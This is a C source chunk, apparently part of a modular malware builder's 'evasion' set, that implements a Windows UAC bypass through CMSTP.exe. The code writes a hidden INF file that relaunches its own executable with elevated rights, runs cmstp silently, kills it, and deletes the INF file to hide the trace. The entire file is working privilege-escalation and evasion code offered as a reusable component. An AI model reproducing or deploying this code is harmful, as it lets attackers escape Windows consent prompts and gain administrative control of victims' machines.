// chunk: evasion/uac_cmstp
// depends: core/run_cmd
// provides: uac_elevate_cmstp
// headers: windows.h
// risk: medium
// note: UAC bypass via CMSTP.exe — creates a temp INF file that launches
//       the payload elevated. CMSTP is an auto-elevate binary.

#ifndef CHUNK_UAC_CMSTP
#define CHUNK_UAC_CMSTP

#include <windows.h>

static int uac_elevate_cmstp(void) {
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    char temp_dir[MAX_PATH], inf_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    snprintf(inf_path, MAX_PATH, "%scmstp_bypass.inf", temp_dir);

    HANDLE hFile = CreateFileA(inf_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    char inf_content[2048];
    snprintf(inf_content, sizeof(inf_content),
        "[version]\r\n"
        "Signature=$chicago$\r\n"
        "AdvancedINF=2.5\r\n"
        "[DefaultInstall]\r\n"
        "CustomDestination=CustInstDestSectionAllUsers\r\n"
        "RunPreSetupCommands=RunPreSetupCommandsSection\r\n"
        "[RunPreSetupCommandsSection]\r\n"
        "; Commands Here will be Run By CMSTP.exe elevated\r\n"
        "%s\r\n"
        "taskkill /IM cmstp.exe /F\r\n"
        "[CustInstDestSectionAllUsers]\r\n"
        "49000,49001=AllUSer_LDIDSection,7\r\n"
        "[AllUSer_LDIDSection]\r\n"
        "\"HKLM\",\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\",\"ProfileInstallPath\",\"%%UnexpectedError%%\",\"\"\r\n"
        "[Strings]\r\n"
        "ServiceName=\"CorpVPN\"\r\n"
        "ShortSvcName=\"CorpVPN\"\r\n",
        self_path);

    DWORD written;
    WriteFile(hFile, inf_content, (DWORD)strlen(inf_content), &written, NULL);
    CloseHandle(hFile);

    char cmd[MAX_PATH + 64];
    snprintf(cmd, sizeof(cmd), "C:\\Windows\\System32\\cmstp.exe /s /au \"%s\"", inf_path);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    DeleteFileA(inf_path);
    return 1;
}

#endif
